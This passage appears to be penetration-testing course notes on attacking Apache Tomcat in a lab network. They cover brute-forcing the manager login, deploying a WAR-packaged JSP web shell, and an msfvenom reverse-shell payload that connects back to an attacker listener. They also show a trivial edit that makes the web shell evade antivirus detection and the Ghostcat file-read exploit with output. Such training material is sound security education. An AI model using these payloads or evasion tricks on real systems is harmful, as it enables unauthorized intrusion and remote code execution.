[Apache Tomcat](https://tomcat.apache.org/) is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts.

# Footprinting
During our external penetration test, we run EyeWitness and see one host listed under "High Value Targets." The tool believes the host is running Tomcat, but we must confirm to plan our attacks. If we are dealing with Tomcat on the external network, this could be an easy foothold into the internal network environment. Tomcat servers can be identified by the Server header in the HTTP response.

If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version.

Here we can see that Tomcat version `9.0.30` is in use.
```bash
http://app-dev.inlanefreight.local:8080/invalid
```
![[tomcat_invalid.webp]]
Custom error pages may be in use that do not leak this version information. In this case, another method of detecting a Tomcat server and version is through the `/docs` page
```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author" 

<SNIP>
```
This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation :
```bash
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```
The `bin` folder stores scripts and binaries needed to start and run a Tomcat server.

The `conf` folder stores various configuration files used by Tomcat.

The `tomcat-users.xml` file stores user credentials and their assigned roles.

The `lib` folder holds the various JAR files needed for the correct functioning of Tomcat.

The `logs` and `temp` folders store temporary log files.

The `webapps` folder is the default webroot of Tomcat and hosts all the applications.

The `work` folder acts as a cache and is used to store data during runtime.

Each folder inside `webapps` is expected to have the following structure.
```bash
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```

The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor.

This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the `WEB-INF/classes` folder.

These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website.

The `lib` folder stores the libraries needed by that particular application. The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), formerly known as `JavaServer Pages`, which can be compared to PHP files on an Apache server.

Here’s an example web.xml file.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "<http://java.sun.com/dtd/web-app_2_3.dtd>">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```

The `web.xml` configuration above defines a new servlet named `AdminServlet` that is mapped to the class `com.inlanefreight.api.AdminServlet`. Java uses the dot notation to create package names, meaning the path on disk for the class defined above would be:

- `classes/com/inlanefreight/api/AdminServlet.class`

Next, a new servlet mapping is created to map requests to `/admin` with `AdminServlet`. This configuration will send any request received for `/admin` to the `AdminServlet.class` class for processing. The `web.xml` descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.

The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.
```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="<http://tomcat.apache.org/xml>"
              xmlns:xsi="<http://www.w3.org/2001/XMLSchema-instance>"
              xsi:schemaLocation="<http://tomcat.apache.org/xml> tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />

</tomcat-users>
```

The file shows us what each of the roles `manager-gui`, `manager-script`, `manager-jmx`, and `manager-status` provide access to. In this example, we can see that a user `tomcat` with the password `tomcat` has the `manager-gui` role, and a second weak password `admin` is set for the user account `admin`

# Enumeration

After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the `/manager` and the `/host-manager` pages.

We can attempt to locate these with a tool such as `Gobuster` or just browse directly to them.

```bash
gobuster dir -u <http://web01.inlanefreight.local:8180/> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            <http://web01.inlanefreight.local:8180/>
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/21 17:34:54 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
Progress: 49959 / 87665 (56.99%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/09/21 17:44:29 Finished
===============================================================
```

We may be able to either log in to one of these using weak credentials such as `tomcat:tomcat`, `admin:admin`, etc.

If these first few tries don't work, we can try a password brute force attack against the login page, covered in the next section.

If we are successful in logging in, we can upload a [Web Application Resource or Web Application ARchive (WAR)](https://en.wikipedia.org/wiki/WAR_(file_format)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web) file containing a JSP web shell and obtain remote code execution on the Tomcat server.

Now that we've learned about the structure and function of Tomcat let's attack it by abusing built-in functionality and exploiting a well-known vulnerability that affected specific versions of Tomcat.

# Attacking Tomcat

As discussed in the previous section, if we can access the `/manager` or `/host-manager` endpoints, we can likely achieve remote code execution on the Tomcat server.

Let's start by brute-forcing the Tomcat manager page on the Tomcat instance at `http://web01.inlanefreight.local:8180`.

We can use the [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) Metasploit module for these purposes, Burp Suite Intruder or any number of scripts to achieve this.

We'll use Metasploit for our purposes.

### Tomcat Manager - Login Brute Force

We first have to set a few options.

Again, we must specify the vhost and the target's IP address to interact with the target properly.

We should also set `STOP_ON_SUCCESS` to `true` so the scanner stops when we get a successful login, no use in generating loads of additional requests after a successful login :

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

As always, we check to make sure everything is set up correctly by `show options`.

We hit `run` and get a hit for the credential pair `tomcat:admin` :

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot.
- To do this, first, fire up Burp Suite and then set the `PROXIES` option like the following:

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080

PROXIES => HTTP:127.0.0.1:8080

msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
```

We can see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth that Tomcat uses.
![[burp_tomcat.webp]]

A quick check of the value in the `Authorization` header for one request shows that the scanner is running correctly, base64 encoding the credentials `admin:vagrant` the way the Tomcat application would do when a user attempts to log in directly from the web application.

Try this out for some examples throughout this module to start getting comfortable with debugging through a proxy.

```bash
echo YWRtaW46dmFncmFudA== |base64 -d

admin:vagrant
```

We can also use [this](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Python script to achieve the same result.

### Tomcat Manager - WAR File Upload

Many Tomcat installations provide a GUI interface to manage the application.

This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access.

Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application.

A WAR, or `Web Application Archive`, is used to quickly deploy web applications and backup storage.

After performing a brute force attack and answering questions 1 and 2 below, browse to `http://web01.inlanefreight.local:8180/manager/html` and enter the credentials.
![[tomcat_mgr.webp]]

The manager web app allows us to instantly deploy new applications by uploading WAR files.

A WAR file can be created using the zip utility.

A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.

```bash
wget <https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp>
zip -r backup.war cmd.jsp 

  adding: cmd.jsp (deflated 81%)
```

Click on `Browse` to select the .war file and then click on `Deploy` :
![[mgr_deploy.webp]]

This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table :

```bash
<http://web01.inlanefreight.local:8180/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=54DA226F01ED3A0F5C3C3DC78EBAFFE7>
```
![[war_deployed.webp]]

If we click on `backup`, we will get redirected to `http://web01.inlanefreight.local:8180/backup/` and get a `404 Not Found` error.

We need to specify the `cmd.jsp` file in the URL as well.

Browsing to `http://web01.inlanefreight.local:8180/backup/cmd.jsp` will present us with a web shell that we can use to run commands on the Tomcat server.

From here, we could upgrade our web shell to an interactive reverse shell and continue.

Like previous examples, we can interact with this web shell via the browser or using `cURL` on the command line. 
Try both!
```bash
curl <http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id>
```

To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the `backups` application after, of course, noting down the file and upload location for our report, which in our example is `/opt/tomcat/apache-tomcat-10.0.10/webapps`.

If we do an `ls` on that directory from our web shell, we'll see the uploaded `backup.war` file and the `backup` directory containing the `cmd.jsp` script and `META-INF` created after the application deploys.

Clicking on `Undeploy` will typically remove the uploaded WAR archive and the directory associated with the application.

We could also use `msfvenom` to generate a malicious WAR file.

The payload [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file. Browse to the Tomcat console and deploy this file.

Tomcat automatically extracts the WAR file contents and deploys it.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

Payload size: 1098 bytes
Final size of war file: 1098 bytes
```

Start a Netcat listener and click on `/backup` to execute the shell :
```bash
nc -lnvp 4443

listening on [any] 4443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224

id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

- The [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process shown above, but we'll leave this as an exercise for the reader.
- [This](https://github.com/SecurityRiskAdvisors/cmd.jsp) JSP web shell is very lightweight (under 1kb) and utilizes a [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded `cmd.jsp` would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).

The web shell as is only gets detected by 2/58 anti-virus vendors.
![[vt2.webp]]

A simple change such as changing:
```java
# From this
FileOutputStream(f);stream.write(m);o="Uploaded:

# To this 
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```

results in 0/58 security vendors flagging the `cmd.jsp` file as malicious at the time of writing.

**A Quick Note on Web shells**

When we upload web shells (especially on externals), we want to prevent unauthorized access.

We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it.

We don't want an attacker to come across our web shell and leverage it to gain their own foothold.

### **CVE-2020-1938 : Ghostcat**

Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938).

All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable.

This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat.

AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests.

This is typically used in proxying requests to application servers behind the front-end web servers.

The AJP service is usually running at port 8009 on a Tomcat server.

This can be checked with a targeted Nmap scan
```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local

Starting Nmap 7.80 ( <https://nmap.org> ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

The above scan confirms that ports 8080 and 8009 are open.

The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi).

Download the script and save it locally.

The exploit can only read files and folders within the web apps folder, which means that files like `/etc/passwd` can’t be accessed
```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      <http://www.apache.org/licenses/LICENSE-2.0>

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="<http://xmlns.jcp.org/xml/ns/javaee>"
  xmlns:xsi="<http://www.w3.org/2001/XMLSchema-instance>"
  xsi:schemaLocation="<http://xmlns.jcp.org/xml/ns/javaee>
                      <http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd>"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```

In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file